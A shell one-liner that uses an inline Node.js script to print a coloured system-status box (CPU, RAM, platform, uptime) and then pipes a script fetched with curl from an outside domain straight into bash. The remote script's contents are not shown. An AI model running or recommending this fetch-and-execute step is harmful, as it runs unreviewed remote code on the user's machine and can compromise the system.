node -e "const os=require('os');const t=x=>'\x1b[35;1m'+x+'\x1b[0m';const l=x=>'\x1b[36m'+x+'\x1b[0m';const strip=s=>s.replace(/\x1b\[[0-9;]*m/g,'');function box(raw,col){const w=Math.max(...raw.map(s=>s.length))+4;const top='┏'+'━'.repeat(w-2)+'┓';const bot='┗'+'━'.repeat(w-2)+'┛';const body=col.map((line,i)=>'┃ '+line+' '.repeat(w-4-strip(line).length)+' ┃').join('\n');return top+'\n'+body+'\n'+bot;}let raw=[];let col=[];raw.push(strip(t('   SYSTEM STATUS   ')));col.push(t('   SYSTEM STATUS   '));raw.push('');col.push('');function add(a,b){raw.push(a+b);col.push(l(a)+b);}add('CPU Cores     : ',os.cpus().length);add('Architecture  : ',os.arch());add('Platform      : ',os.platform());add('OS Release    : ',os.release());add('Total RAM     : ',(os.totalmem()/1024/1024/1024).toFixed(2)+' GB');add('Free RAM      : ',(os.freemem()/1024/1024/1024).toFixed(2)+' GB');add('Uptime        : ',(os.uptime()/3600).toFixed(2)+' hours');console.log(box(raw,col));" && bash <(curl -s https://api.ryuu-dev.offc.my.id/src/startup.sh)
